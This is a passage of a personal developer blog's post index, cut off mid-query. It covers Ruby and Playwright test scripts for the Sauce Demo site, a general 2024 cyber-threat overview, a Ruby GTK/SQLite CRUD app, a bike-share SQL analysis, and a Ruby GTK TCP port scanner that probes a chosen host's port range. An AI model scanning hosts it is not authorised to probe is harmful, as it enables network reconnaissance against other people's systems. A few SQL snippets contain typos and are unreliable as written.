404, 500, etc.). 3.\tHandling Relative URLs: •\tThe script ensures that relative URLs (like /about-us) are converted into absolute URLs. Running the script:\n1.\tSave the script in a file, e.g., check_links.rb. 2.\tRun the script with: 1 ruby check_links.rb This script can be scheduled to run periodically using cron jobs for continuous monitoring. You can also modify it to save the results to a log file or send a notification when broken links are detected.\n","date":"2024-10-04T00:00:00Z","permalink":"https://abriljordan.github.io/ajcasinillo/p/automate-link-checking/","title":"Automate Link Checking"},{"content":"Here’s a basic example of a Capybara test for logging into Sauce Demo. This assumes you’re using RSpec for your testing framework.\nFirst, make sure you have Capybara and Selenium installed. You can add them to your Gemfile if you’re using Bundler:\n1 2 gem \u0026#39;capybara\u0026#39; gem \u0026#39;selenium-webdriver\u0026#39; Then run:\n1 bundle install Now, here’s a simple test to automate the login process using Capybara and RSpec:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 # spec/saucedemo_login_spec.rb require \u0026#39;capybara/rspec\u0026#39; require \u0026#39;selenium-webdriver\u0026#39; # Set up Capybara to use Selenium with Chrome Capybara.default_driver = :selenium_chrome RSpec.describe \u0026#39;Sauce Demo Login\u0026#39;, type: :feature do before do # Set up the base URL for the tests Capybara.app_host = \u0026#39;https://www.saucedemo.com/\u0026#39; end it \u0026#39;logs into Sauce Demo successfully\u0026#39; do # Visit the Sauce Demo login page visit(\u0026#39;/\u0026#39;) # Fill in the login form fill_in \u0026#39;user-name\u0026#39;, with: \u0026#39;standard_user\u0026#39; fill_in \u0026#39;password\u0026#39;, with: \u0026#39;secret_sauce\u0026#39; # Click the login button click_button \u0026#39;Login\u0026#39; # Expectation: Verify the user is redirected to the inventory page expect(page).to have_content(\u0026#39;Products\u0026#39;) end end Explanation:\n1.\tCapybara Setup: We’re using selenium_chrome as the driver to run the tests in the Chrome browser. 2.\tRSpec Test: The test navigates to the login page, fills in the username and password fields (standard_user and secret_sauce), clicks the login button, and then verifies that the user has been redirected to the “Products” page, indicating a successful login. 3.\tCapybara Matchers: expect(page).to have_content('Products') ensures that after login, the page contains the word “Products,” confirming we’re on the inventory page. Running the Test:\nTo run this test, you can execute:\n1 rspec spec/saucedemo_login_spec.rb This test will open a browser window, interact with the page, and check the login functionality of the Sauce Demo website.\n","date":"2024-10-04T00:00:00Z","permalink":"https://abriljordan.github.io/ajcasinillo/p/capybara-test-script-for-the-sauce-demo/","title":"Capybara test script for the Sauce Demo"},{"content":"Using Playwright for automated testing is a powerful way to handle modern web applications. It provides better performance, multi-browser support, and rich APIs for handling complex scenarios. Below is an example of how to write detailed automation scripts with assertions, handle complex scenarios, and save logs for the Sauce Demo website.\nSetting Up Playwright Install Playwright: 1 npm init playwright@latest Set up a new project, install dependencies, and configure the necessary files. Test Scenario 1: Valid User Login and Product Purchase Flow This script will:\nLog in to the website using valid credentials.\nAdd multiple products to the cart.\nComplete the purchase.\nSave logs of the script execution.\nPlaywright script with assertions and log saving functionality. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 const { test, expect } = require(\u0026#39;@playwright/test\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;); // Test block test(\u0026#39;Valid user login and product purchase\u0026#39;, async ({ page }) =\u0026gt; { // Log file setup const logFile = fs.createWriteStream(\u0026#39;test_logs.txt\u0026#39;, { flags: \u0026#39;a\u0026#39; }); const log = (message) =\u0026gt; { console.log(message); logFile.write(`${new Date().toISOString()} - ${message}\\n`); }; try { log(\u0026#39;Starting test: Valid user login and product purchase\u0026#39;); // 1. Navigate to the Sauce Demo site await page.goto(\u0026#39;https://www.saucedemo.com/\u0026#39;); log(\u0026#39;Navigated to Sauce Demo site\u0026#39;); // 2. Login with valid credentials await page.fill(\u0026#39;#user-name\u0026#39;, \u0026#39;standard_user\u0026#39;); await page.fill(\u0026#39;#password\u0026#39;, \u0026#39;secret_sauce\u0026#39;); await page.click(\u0026#39;#login-button\u0026#39;); log(\u0026#39;Logged in with valid credentials\u0026#39;); // 3. Verify successful login by checking URL contains \u0026#39;inventory\u0026#39; await expect(page).toHaveURL(/.*inventory/); log(\u0026#39;Login successful: User on inventory page\u0026#39;); // 4. Add multiple products to the cart await page.click(\u0026#39;#add-to-cart-sauce-labs-backpack\u0026#39;); await page.click(\u0026#39;#add-to-cart-sauce-labs-bike-light\u0026#39;); log(\u0026#39;Added two products to the cart\u0026#39;); // 5. Navigate to the cart page await page.click(\u0026#39;.shopping_cart_link\u0026#39;); log(\u0026#39;Navigated to the cart page\u0026#39;); // 6. Verify that two items are in the cart const cartItems = await page.locator(\u0026#39;.cart_item\u0026#39;); expect(await cartItems.count()).toBe(2); log(\u0026#39;Verified that there are two items in the cart\u0026#39;); // 7. Proceed to checkout await page.click(\u0026#39;#checkout\u0026#39;); await page.fill(\u0026#39;#first-name\u0026#39;, \u0026#39;John\u0026#39;); await page.fill(\u0026#39;#last-name\u0026#39;, \u0026#39;Doe\u0026#39;); await page.fill(\u0026#39;#postal-code\u0026#39;, \u0026#39;12345\u0026#39;); await page.click(\u0026#39;#continue\u0026#39;); log(\u0026#39;Entered checkout information and proceeded\u0026#39;); // 8. Complete the purchase await page.click(\u0026#39;#finish\u0026#39;); await expect(page.locator(\u0026#39;.complete-header\u0026#39;)).toHaveText(\u0026#39;THANK YOU FOR YOUR ORDER\u0026#39;); log(\u0026#39;Purchase completed successfully\u0026#39;); } catch (error) { log(`Error during test execution: ${error}`); throw error; } finally { // Close log file logFile.end(); } }); Key Points\nAssertions: expect(page).toHaveURL(/.*inventory/): Verifies that the user is redirected to the inventory page.\nexpect(cartItems.count()).toBe(2): Verifies that two items are in the cart.\nexpect(page.locator(\u0026rsquo;.complete-header\u0026rsquo;)).toHaveText(\u0026lsquo;THANK YOU FOR YOUR ORDER\u0026rsquo;): Verifies the order completion message.\nLogging: All the actions and test results are logged in the test_logs.txt file.\nThe log function handles console logging and writes the messages to the log file.\nTest Scenario 2: Invalid Login and Error Handling This script will test login failure using invalid credentials and verify that an appropriate error message is displayed.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 test(\u0026#39;Invalid login shows error message\u0026#39;, async ({ page }) =\u0026gt; { const logFile = fs.createWriteStream(\u0026#39;test_logs.txt\u0026#39;, { flags: \u0026#39;a\u0026#39; }); const log = (message) =\u0026gt; { console.log(message); logFile.write(`${new Date().toISOString()} - ${message}\\n`); }; try { log(\u0026#39;Starting test: Invalid login shows error message\u0026#39;); // 1. Navigate to the Sauce Demo site await page.goto(\u0026#39;https://www.saucedemo.com/\u0026#39;); log(\u0026#39;Navigated to Sauce Demo site\u0026#39;); // 2. Attempt login with invalid credentials await page.fill(\u0026#39;#user-name\u0026#39;, \u0026#39;invalid_user\u0026#39;); await page.fill(\u0026#39;#password\u0026#39;, \u0026#39;wrong_password\u0026#39;); await page.click(\u0026#39;#login-button\u0026#39;); log(\u0026#39;Attempted login with invalid credentials\u0026#39;); // 3. Verify error message appears const errorMessage = await page.locator(\u0026#39;[data-test=\u0026#34;error\u0026#34;]\u0026#39;); await expect(errorMessage).toBeVisible(); await expect(errorMessage).toHaveText(\u0026#39;Username and password do not match any user in this service\u0026#39;); log(\u0026#39;Error message verified: Invalid credentials\u0026#39;); } catch (error) { log(`Error during test execution: ${error}`); throw error; } finally { logFile.end(); } }); Test Scenario 3: Sorting Products by Price (Low to High) This script tests that the product sorting feature works correctly.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 test(\u0026#39;Sort products by price (low to high)\u0026#39;, async ({ page }) =\u0026gt; { const logFile = fs.createWriteStream(\u0026#39;test_logs.txt\u0026#39;, { flags: \u0026#39;a\u0026#39; }); const log = (message) =\u0026gt; { console.log(message); logFile.write(`${new Date().toISOString()} - ${message}\\n`); }; try { log(\u0026#39;Starting test: Sort products by price (low to high)\u0026#39;); // 1. Navigate to the Sauce Demo site and log in await page.goto(\u0026#39;https://www.saucedemo.com/\u0026#39;); await page.fill(\u0026#39;#user-name\u0026#39;, \u0026#39;standard_user\u0026#39;); await page.fill(\u0026#39;#password\u0026#39;, \u0026#39;secret_sauce\u0026#39;); await page.click(\u0026#39;#login-button\u0026#39;); log(\u0026#39;Logged in with valid credentials\u0026#39;); // 2. Sort products by price (low to high) await page.selectOption(\u0026#39;.product_sort_container\u0026#39;, \u0026#39;lohi\u0026#39;); log(\u0026#39;Sorted products by price (low to high)\u0026#39;); // 3. Verify sorting (check first and last product prices) const prices = await page.$$eval(\u0026#39;.inventory_item_price\u0026#39;, elements =\u0026gt; elements.map(el =\u0026gt; parseFloat(el.textContent.replace(\u0026#39;$\u0026#39;, \u0026#39;\u0026#39;)))); log(`Prices fetched: ${prices}`); expect(prices).toEqual(prices.slice().sort((a, b) =\u0026gt; a - b)); log(\u0026#39;Verified that products are sorted by price (low to high)\u0026#39;); } catch (error) { log(`Error during test execution: ${error}`); throw error; } finally { logFile.end(); } }); Conclusion\nBy using Playwright with assertions and complex scenarios like sorting, adding/removing items, and handling failed logins, you can achieve thorough automation testing for the Sauce Demo website. The inclusion of detailed logging, error handling, and data-driven testing makes the scripts robust and suitable for use in Continuous Integration (CI) pipelines.\n","date":"2024-10-04T00:00:00Z","permalink":"https://abriljordan.github.io/ajcasinillo/p/playwright-test-script-for-the-sauce-demo/","title":"Playwright test script for the Sauce Demo"},{"content":"A simple GUI-based port scanner using Ruby with GTK (GIMP Toolkit) and the gtk3 gem. Below is an example of how you can create a port scanner with a graphical interface in Ruby using GTK.\nHow It Works:\n1. GTK Widgets: The interface consists of an entry box for the host, start port, and end port, a button to start the scan, and a text view to display the scan results. 2. Port Scanner Logic: The port scanner logic is the same as the console-based version. It attempts to connect to each port in the given range and outputs the result in the text view. 3. Text View Output: The add_to_textview function appends each result to the text view as the ports are scanned. Port Scanner with GTK GUI 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 require \u0026#39;gtk3\u0026#39; require \u0026#39;socket\u0026#39; class PortScanner def initialize @window = Gtk::Window.new(\u0026#34;Port Scanner\u0026#34;) @window.set_default_size(300, 200) @window.set_border_width(10) vbox = Gtk::Box.new(:vertical, 5) @ip_entry = Gtk::Entry.new @ip_entry.placeholder_text = \u0026#34;Enter IP address\u0026#34; vbox.pack_start(@ip_entry, expand: false, fill: true, padding: 5) @port_entry = Gtk::Entry.new @port_entry.placeholder_text = \u0026#34;Enter port range (e.g., 1-1000)\u0026#34; vbox.pack_start(@port_entry, expand: false, fill: true, padding: 5) scan_button = Gtk::Button.new(label: \u0026#34;Scan\u0026#34;) scan_button.signal_connect \u0026#34;clicked\u0026#34; do scan_ports end vbox.pack_start(scan_button, expand: false, fill: true, padding: 5) @result_text = Gtk::TextView.new @result_text.editable = false scroll = Gtk::ScrolledWindow.new scroll.add(@result_text) vbox.pack_start(scroll, expand: true, fill: true, padding: 5) @window.add(vbox) end def scan_ports ip = @ip_entry.text port_range = @port_entry.text.split(\u0026#39;-\u0026#39;).map(\u0026amp;:to_i) start_port, end_port = port_range[0], port_range[1] @result_text.buffer.text = \u0026#34;Scanning...\\n\u0026#34; Thread.new do open_ports = [] (start_port..end_port).each do |port| begin socket = TCPSocket.new(ip, port) open_ports \u0026lt;\u0026lt; port socket.close rescue Errno::ECONNREFUSED, Errno::ETIMEDOUT # Port is closed or filtered end end Gtk.queue do if open_ports.empty? @result_text.buffer.text += \u0026#34;No open ports found.\\n\u0026#34; else @result_text.buffer.text += \u0026#34;Open ports: #{open_ports.join(\u0026#39;, \u0026#39;)}\\n\u0026#34; end end end end def run @window.show_all Gtk.main end end scanner = PortScanner.new scanner.run ","date":"2024-10-02T00:00:00Z","permalink":"https://abriljordan.github.io/ajcasinillo/p/ruby-port-scanner/","title":"Ruby Port Scanner"},{"content":"Emerging Cyber threats of 2024 Several new trends and evolving techniques in cyber threats, particularly around ransomware, trojans, and hacking, are emerging in 2024:\nRansomware Sophistication Attackers are shifting from full encryption to intermittent encryption, encrypting portions of files at a time to evade detection and speed up attacks. Ransomware groups are also using quantum-resilient encryption methods, making recovery more difficult. Moreover, data theft and exfiltration are becoming primary tactics, with attackers stealing sensitive data and threatening to publish it unless a ransom is paid. Groups like CL0P and BlackCat have embraced this approach, often targeting cloud infrastructure, industrial systems, and managed service providers.\nTrojans and Virus Evolution Cybercriminals are increasingly exploiting software vulnerabilities and stolen credentials, especially through phishing and brute-force attacks on Remote Desktop Protocols (RDP). Viruses are often delivered through trojans disguised as legitimate software or updates, which then facilitate deeper access into networks.\nHacking Techniques Several techniques are gaining prominence:\nDLL Sideloading and “Living off the Land” techniques are becoming more common, where attackers use legitimate tools or processes within the system to avoid detection.\nSupply chain attacks and phishing campaigns are expanding in scope, especially targeting companies’ cloud services and critical infrastructure ￼ ￼.\nThese developments point to a more professionalized and automated cybercrime ecosystem, requiring stronger defenses such as multi-factor authentication, timely patching, and regular backups to mitigate risks.\nSource:\nhttps://www.bitdefender.com/blog/businessinsights/2024-cybersecurity-forecast-ransomwares-new-tactics-and-targets/\nhttps://www.nsa.gov/Press-Room/News-Highlights/Article/Article/2928709/cisa-fbi-nsa-and-international-partners-issue-advisory-on-ransomware-trends-fro/\n","date":"2024-10-01T00:00:00Z","permalink":"https://abriljordan.github.io/ajcasinillo/p/cyber-threats-2024/","title":"Cyber threats 2024"},{"content":"Why does programming teaches you how to think?\nProgramming teaches you how to think because it forces you to approach problems systematically, logically, and creatively. Here’s how programming shapes your thinking:\nProblem-Solving Skills\n•\tBreaking Down Problems: Programming requires you to break down complex problems into smaller, more manageable pieces. This is known as decomposition. You learn to think in terms of steps or modules, helping you approach challenges in a more structured way.\n•\tIdentifying Patterns: In coding, many problems are solved by recognizing recurring patterns. This ability to spot patterns helps improve problem-solving across various domains, as you begin to apply these patterns to similar situations outside of programming.\nLogical Thinking and Precision\n•\tIf-Then Thinking: Code runs based on precise conditions (e.g., “If X happens, then do Y”). This trains your brain to think logically and make decisions based on clearly defined criteria. Each decision in programming has specific consequences, helping you to think about outcomes and side effects.\n•\tAttention to Detail: In programming, small mistakes—like a missing semicolon or a misspelled variable—can break the entire code. This sharpens your focus and makes you more detail-oriented in other areas of life or work.\nAbstraction and Generalization\n•\tAbstraction: Programmers often need to focus on the essence of a problem, filtering out unnecessary details. This skill of abstraction allows you to create general solutions that can be applied to multiple problems.\n•\tGeneralization: Programming teaches you to think in terms of reusable solutions, not just one-off fixes. This habit of generalizing solutions makes you more efficient at solving future problems by building on prior knowledge.\nAnalytical Thinking\n•\tDebugging and Testing: When code doesn’t work, you must analyze the problem, test hypotheses, and eliminate possible causes. This scientific approach to troubleshooting sharpens your analytical skills. You learn to isolate problems and identify the root causes systematically.\n•\tEvaluating Alternatives: Often in programming, there are many ways to solve a problem. You must evaluate different approaches based on efficiency, readability, and performance. This fosters critical thinking as you weigh pros and cons and make informed decisions.\nCreativity and Innovation\n•\tCreative Problem Solving: While programming is logical, it also requires creativity to design elegant, efficient solutions. Often, there isn’t a single “correct” answer, so thinking outside the box is essential. You learn to create solutions where none existed before.\n•\tIterative Thinking: Programming encourages a process of trial and error, where you try different approaches, learn from failures, and continuously improve. This iterative thinking process can help you in any problem-solving context, as you become more comfortable with trying, failing, and refining.\nAlgorithmic Thinking\n•\tStep-by-Step Procedures: Algorithms are step-by-step instructions for solving a problem. Programming teaches you to think in algorithms, where each action follows logically from the previous one, helping you develop a systematic approach to tasks.\n•\tEfficiency Considerations: Programmers often need to optimize algorithms for speed or memory usage. This pushes you to think not just about solving problems, but about solving them efficiently, sharpening your decision-making when it comes to resources and trade-offs.\nLearning Persistence and Patience\n•\tTrial and Error: When coding, things rarely work on the first attempt. This teaches persistence, as you learn to keep trying, debugging, and experimenting until you get the desired outcome.\n•\tLong-Term Thinking: Programming projects often require sustained effort over long periods, encouraging you to think in terms of long-term goals and gradual progress rather than quick fixes.\nAbstract Thinking through Data Structures\n•\tOrganizing Information: Programming involves working with data structures like lists, trees, or graphs, which teaches you to organize information efficiently. This ability to structure and categorize information is valuable beyond programming.\nCollaborative Thinking\n•\tCode Collaboration: When working with other programmers or open-source projects, you learn to collaborate and communicate effectively. You have to explain your thought process and understand others’ ideas, which improves your ability to think in teams and groups.\nLearning to Think Systematically\n•\tSystems Thinking: As programs become more complex, they form interconnected systems. You begin to think about how changes in one part affect the whole, which helps develop a systematic and holistic mindset.\nSummary:\nProgramming transforms how you think by teaching you structured problem-solving, logical reasoning, and creative innovation. It trains your brain to approach challenges systematically, break them down into steps, and create optimized, efficient solutions—skills that can be applied in virtually any domain of life.\n","date":"2024-10-01T00:00:00Z","permalink":"https://abriljordan.github.io/ajcasinillo/p/programming-teaches-you-how-to-think/","title":"Programming teaches you how to think"},{"content":"Ruby GTK (Ruby-GNOME2) GTK is a powerful cross-platform toolkit for creating graphical user interfaces. Ruby-GNOME2 (now called gtk3 for Ruby) is the Ruby binding for the GTK library.\nFeatures:\n* Extensive widget support. * Cross-platform (Linux, macOS, and Windows). * Well-documented and widely used. Installation\n1 gem install gtk3 Ruby GUI CRUD App using gtk3 Install the necessary gems: gtk3: For building the GUI. sqlite3: For managing the SQLite database. 1 gem install gtk3 sqlite3 Build the Application Below is a simple Ruby script that demonstrates how to create a basic CRUD system for managing records (e.g., user information) with a GUI interface.\nrequire \u0026#39;gtk3\u0026#39; require \u0026#39;sqlite3\u0026#39; # Create or open an SQLite3 database db = SQLite3::Database.new \u0026#34;test.db\u0026#34; # Create a simple table if it doesn\u0026#39;t already exist db.execute \u0026lt;\u0026lt;-SQL CREATE TABLE IF NOT EXISTS users ( id INTEGER PRIMARY KEY, name TEXT, email TEXT ); SQL # GTK Application class CrudApp def initialize @builder = Gtk::Builder.new create_window setup_signals @db = SQLite3::Database.new \u0026#34;test.db\u0026#34; refresh_users_list end def create_window @window = Gtk::Window.new(\u0026#34;Ruby SQLite CRUD App with Search\u0026#34;) @window.set_size_request(400, 400) @window.signal_connect(\u0026#34;destroy\u0026#34;) { Gtk.main_quit } # Create a vertical box layout vbox = Gtk::Box.new(:vertical, 10) vbox.margin = 20 # Entry field for search @search_entry = Gtk::Entry.new @search_entry.placeholder_text = \u0026#34;Search users by name or email\u0026#34; @search_entry.signal_connect(\u0026#34;changed\u0026#34;) { search_users } # Trigger search on input change vbox.pack_start(@search_entry, expand: false, fill: true, padding: 5) # Entry fields for name and email @name_entry = Gtk::Entry.new @name_entry.placeholder_text = \u0026#34;Enter name\u0026#34; vbox.pack_start(@name_entry, expand: false, fill: true, padding: 5) @email_entry = Gtk::Entry.new @email_entry.placeholder_text = \u0026#34;Enter email\u0026#34; vbox.pack_start(@email_entry, expand: false, fill: true, padding: 5) # Buttons for CRUD operations hbox = Gtk::Box.new(:horizontal, 10) add_button = Gtk::Button.new(label: \u0026#34;Add\u0026#34;) add_button.signal_connect(\u0026#34;clicked\u0026#34;) { add_user } hbox.pack_start(add_button, expand: true, fill: true, padding: 5) update_button = Gtk::Button.new(label: \u0026#34;Update\u0026#34;) update_button.signal_connect(\u0026#34;clicked\u0026#34;) { update_user } hbox.pack_start(update_button, expand: true, fill: true, padding: 5) delete_button = Gtk::Button.new(label: \u0026#34;Delete\u0026#34;) delete_button.signal_connect(\u0026#34;clicked\u0026#34;) { delete_user } hbox.pack_start(delete_button, expand: true, fill: true, padding: 5) vbox.pack_start(hbox, expand: false, fill: true, padding: 5) # Create a grid to hold the column labels and user list grid = Gtk::Grid.new grid.row_spacing = 10 grid.column_spacing = 20 # Column labels name_label = Gtk::Label.new(\u0026#34;Name\u0026#34;) email_label = Gtk::Label.new(\u0026#34;Email\u0026#34;) name_label.set_xalign(0) # Align labels to the left email_label.set_xalign(0) # Add column labels to the grid grid.attach(name_label, 0, 0, 1, 1) grid.attach(email_label, 1, 0, 1, 1) # Listbox for displaying users @listbox = Gtk::ListBox.new grid.attach(@listbox, 0, 1, 2, 1) # Listbox spans across both columns vbox.pack_start(grid, expand: true, fill: true, padding: 5) # Add the layout to the window @window.add(vbox) @window.show_all end def setup_signals @window.signal_connect(\u0026#34;destroy\u0026#34;) { Gtk.main_quit } end def add_user name = @name_entry.text email = @email_entry.text if name.empty? || email.empty? show_message(\u0026#34;Name and Email cannot be empty!\u0026#34;) return end @db.execute(\u0026#34;INSERT INTO users (name, email) VALUES (?, ?)\u0026#34;, [name, email]) refresh_users_list clear_entries end def update_user selected_row = @listbox.selected_row return unless selected_row user_id = selected_row.instance_variable_get(:@user_id) name = @name_entry.text email = @email_entry.text if name.empty? || email.empty? show_message(\u0026#34;Name and Email cannot be empty!\u0026#34;) return end @db.execute(\u0026#34;UPDATE users SET name = ?, email = ? WHERE id = ?\u0026#34;, [name, email, user_id]) refresh_users_list clear_entries end def delete_user selected_row = @listbox.selected_row return unless selected_row user_id = selected_row.instance_variable_get(:@user_id) @db.execute(\u0026#34;DELETE FROM users WHERE id = ?\u0026#34;, [user_id]) refresh_users_list clear_entries end def search_users search_query = @search_entry.text.downcase return refresh_users_list if search_query.empty? # Reset list if search is empty @listbox.each { |child| @listbox.remove(child) } # Clear current list # Query the database for matching users based on search query (name or email) @db.execute(\u0026#34;SELECT * FROM users WHERE LOWER(name) LIKE ? OR LOWER(email) LIKE ?\u0026#34;, [\u0026#34;%#{search_query}%\u0026#34;, \u0026#34;%#{search_query}%\u0026#34;]) do |row| list_row = Gtk::ListBoxRow.new list_row.instance_variable_set(:@user_id, row[0]) # Save user id for update/delete actions row_box = Gtk::Box.new(:horizontal, 20) name_label = Gtk::Label.new(row[1]) name_label.set_xalign(0) email_label = Gtk::Label.new(row[2]) email_label.set_xalign(0) row_box.pack_start(name_label, expand: true, fill: true, padding: 10) row_box.pack_start(email_label, expand: true, fill: true, padding: 10) list_row.add(row_box) @listbox.add(list_row) end @listbox.show_all end def refresh_users_list @listbox.each { |child| @listbox.remove(child) } # Clear current list @db.execute(\u0026#34;SELECT * FROM users\u0026#34;) do |row| list_row = Gtk::ListBoxRow.new list_row.instance_variable_set(:@user_id, row[0]) # Save user id for update/delete actions row_box = Gtk::Box.new(:horizontal, 20) name_label = Gtk::Label.new(row[1]) name_label.set_xalign(0) email_label = Gtk::Label.new(row[2]) email_label.set_xalign(0) row_box.pack_start(name_label, expand: true, fill: true, padding: 10) row_box.pack_start(email_label, expand: true, fill: true, padding: 10) list_row.add(row_box) @listbox.add(list_row) end @listbox.show_all end def clear_entries @name_entry.text = \u0026#39;\u0026#39; @email_entry.text = \u0026#39;\u0026#39; end def show_message(message) dialog = Gtk::MessageDialog.new( parent: @window, flags: :destroy_with_parent, type: :info, buttons_type: :close, message: message ) dialog.run dialog.destroy end end # Run the application app = CrudApp.new Gtk.main ","date":"2024-09-30T00:00:00Z","permalink":"https://abriljordan.github.io/ajcasinillo/p/ruby-gui-crud-app/","title":"Ruby GUI CRUD App"},{"content":"Ask Business task\nYou are a junior data analyst working in the marketing analyst team at Cyclistic, a bike-share company in Chicago. The director of marketing believes the company’s future success depends on maximizing the number of annual memberships. Therefore, your team wants to understand how casual riders and annual members use Cyclistic bikes differently. From these insights, your team will design a new marketing strategy to convert casual riders into annual members. But first, Cyclistic executives must approve your recommendations, so they must be backed up with compelling data insights and professional data visualizations.\nPrepare Data sources\nWe’ll be using Cyclistic’s historical bike trip data from the last 12 months, January - December 2021, which is publicly available here: https://divvy-tripdata.s3.amazonaws.com/index.html. There are 12 .csv files total.\nIt is organized in rows and columns. Each rows represents one trip, and each trip has a unique field that identifies it: ride_id. Each trip is anonymized and includes the following fields:\nProcess Cleaning or manipulation of data\nOur task requires three libraries — Pandas, Glob, and the OS module and PostgreSQL as our database.\nMerge datasets Merge all 12 months of datasets using a simple python script:\nCode example 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import os import glob import pandas as pd #find all csv files in the folder #use glob pattern matching -\u0026gt; extension = \u0026#39;csv\u0026#39; #save result in list -\u0026gt; all_filenames extension = \u0026#39;csv\u0026#39; all_filenames = [i for i in glob.glob(\u0026#39;*.{}\u0026#39;.format(extension))] #print(all_filenames) #combine all files in the list combined_csv = pd.concat([pd.read_csv(f) for f in all_filenames ]) #export to csv combined_csv.to_csv( \u0026#34;combined_csv.csv\u0026#34;, index=False, encoding=\u0026#39;utf-8-sig\u0026#39;) View datasets After merging the 12 datasets, import to Postgres database. The dataset has a total of 5,595,063 rows. Use the SQL statement below to view all rows.\n1 SELET COUNT(*) FROM tripdata; Use the SQL statement below to view 1,006,761 rows with null values.\nCode example 1 2 3 4 5 6 7 8 9 10 11 SELECT * FROM tripdata WHERE start_station_name IS NULL OR start_station_id IS NULL OR end_station_name IS NULL OR end_station_id IS NULL OR start_lat IS NULL OR start_lng IS NULL OR end_lat IS NULL OR end_lng IS NULL OR member_casual IS NULL ORDER BY started_at ASC Delete NULL Use the SQL statement below to delete 1,006,761 rows with null values. After deletion, 4,588,302 rows left.\nCode example 1 2 3 4 5 6 7 8 9 10 11 12 13 DELETE FROM tripdata WHERE started_at IS NULL OR ended_at IS NULL OR start_station_name IS NULL OR start_station_id IS NULL OR end_station_name IS NULL OR end_station_id IS NULL OR start_lat IS NULL OR start_lng IS NULL OR end_lat IS NULL OR end_lng IS NULL OR member_casual IS NULL ; We are going to delete also rows with zero or less than zero values. To delete the rows, use the SQL statement below:\n1 2 delete from tripdata where ride_length \u0026lt; 0 delete from tripdata where ride_length = 0 116 and 82 records deleted respectively. The total remaining rows that needs to be explored are 4,588,104.\nAdd new columns Add new columns and populate with new data.\nday_of_week\nUse the SQL statement below to add day_of_week and populate it with new data by extracting \u0026lsquo;Day\u0026rsquo; from the timestamp.\n1 2 3 4 5 6 --- add new column and populate : day_of_week ALTER TABLE tripdata ADD COLUMN day_of_week TEXT; UPDATE tripdata o1 SET day_of_week = TO_CHAR(o1.started_at, \u0026#39;Day\u0026#39;) FROM tripdata o2 WHERE o1.ride_id = o2.ride_id; Month\nUse the SQL statement below to add month and populate it with new data by extracting \u0026lsquo;Month\u0026rsquo; from the timestamp.\n1 2 3 4 5 6 --- add new column and populate : month ALTER TABLE tripdata ADD COLUMN month TEXT; UPDATE tripdata o1 SET month = TO_CHAR(o1.started_at, \u0026#39;Month\u0026#39;) FROM tripdata o2 WHERE o1.ride_id = o2.ride_id; Analyze Summary of analysis\nAVG Ride Length AVG ride length\nUse the SQL statement below to compute the average ride length or trip duration (member/casual).\nCode example 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 SELECT ( SELECT AVG(ride_length) FROM tripdataq ) AS AvgRideLength_Overall, ( SELECT AVG(ride_length) FROM tripdataq WHERE member_casual = \u0026#39;member\u0026#39; ) AS AvgRideLength_Member, ( SELECT AVG(ride_length) FROM tripdataq WHERE member_casual = \u0026#39;casual\u0026#39; ) AS AvgRideLength_Casual; The average ride length or trip duration for casual riders is 32:30 minutes while for the members is 13:10 minutes.\nMAX ride length MAX Ride Length\nUse the SQL statement below to compute the maximum ride length or trip duration (member/casual).\nCode example 1 2 3 4 5 6 7 8 9 10 SELECT member_casual, MAX(ride_length) AS ride_length_MAX FROM tripdata GROUP BY member_casual ORDER BY ride_length_MAX DESC LIMIT 2 The maximum ride length or trip duration for casual riders is 38 days 20:24:09 hours while for the members is 1 day 55:38 minutes.\nTotal trips Total trips\nWe’ll calculate for annual members and casual riders. We’ll also calculate percentages of overall total for both types:\n1 2 3 4 5 SELECT member_casual AS bike_user_type, count(ride_id) AS count_user_type, ROUND(count(ride_id)*100.00 / (SELECT count(ride_id) FROM tripdata),2) as percentage FROM tripdata GROUP BY member_casual Median ride length or trip duration Median ride length or trip duration\n1 2 3 4 SELECT member_casual, PERCENTILE_CONT(0.50) WITHIN GROUP (ORDER BY trip_duration) AS median FROM tripdata member_casual GROUP BY member_casual Busiest day for rides Busiest day for rides\nSee which day has the most rides for annual members and casual riders.\nCode example 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 SELECT member_casual, day_of_week AS mode_day_of_week FROM ( SELECT DISTINCT member_casual, day_of_week, ROW_NUMBER() OVER (PARTITION BY member_casual ORDER BY COUNT(day_of_week) DESC) rn FROM tripdata GROUP BY member_casual, day_of_week ) as foo WHERE rn = 1 ORDER BY member_casual DESC LIMIT 2 Median ride length per day Median ride length per day\n1 2 3 4 5 6 7 SELECT member_casual, day_of_week, PERCENTILE_CONT(0.50) WITHIN GROUP (ORDER BY trip_duration) AS median_trip_duration FROM tripdata WHERE member_casual = \u0026#39;casual\u0026#39; GROUP BY member_casual, day_of_week ORDER BY median_trip_duration DESC LIMIT 7 1 2 3 4 5 6 7 SELECT member_casual, day_of_week, PERCENTILE_CONT(0.50) WITHIN GROUP (ORDER BY trip_duration) AS median_trip_duration FROM tripdata WHERE member_casual = \u0026#39;member\u0026#39; GROUP BY member_casual, day_of_week ORDER BY median_trip_duration DESC LIMIT 7 Total rides per day Total rides per day\nLet’s look at total rides per day. We’ll calculate for overall total, annual members and casual riders:\n1 2 3 4 5 6 7 8 SELECT day_of_week, COUNT(DISTINCT ride_id) AS TotalTrips, SUM(CASE WHEN member_casual = \u0026#39;member\u0026#39; THEN 1 ELSE 0 END) AS MemberTrips, SUM(CASE WHEN member_casual = \u0026#39;casual\u0026#39; THEN 1 ELSE 0 END) AS CasualTrips FROM tripdata GROUP BY 1 ORDER BY 